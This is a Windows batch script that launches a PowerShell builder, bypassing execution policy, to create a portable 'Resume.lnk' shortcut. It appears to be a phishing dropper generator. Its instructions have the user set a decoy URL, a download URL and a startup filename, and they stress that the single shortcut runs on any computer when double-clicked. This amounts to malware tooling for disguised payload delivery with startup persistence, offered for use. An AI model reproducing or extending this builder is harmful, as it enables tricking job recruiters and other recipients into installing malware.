@echo off
:: ============================================
:: CREATE PORTABLE RESUME.LNK
:: ============================================
:: ONE file with EVERYTHING embedded!
:: ============================================

echo.
echo ========================================
echo   CREATE PORTABLE RESUME.LNK
echo ========================================
echo.

:: Run PowerShell script
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0CREATE_PORTABLE_LNK.ps1"

echo.
echo ========================================
echo   HOW TO CUSTOMIZE
echo ========================================
echo.
echo To change URLs:
echo   1. Edit CREATE_PORTABLE_LNK.ps1
echo   2. Find lines 10-12:
echo      $DECOY_URL = "..."
echo      $DOWNLOAD_URL = "..."
echo      $STARTUP_FILENAME = "..."
echo   3. Change them
echo   4. Run this bat file again
echo.
echo ========================================
echo   PORTABILITY
echo ========================================
echo.
echo Your Resume.lnk is NOW PORTABLE!
echo.
echo   * Copy JUST Resume.lnk
echo   * To ANY computer
echo   * In ANY folder
echo   * Double-click = Works!
echo.
echo NO external files needed!
echo.

pause
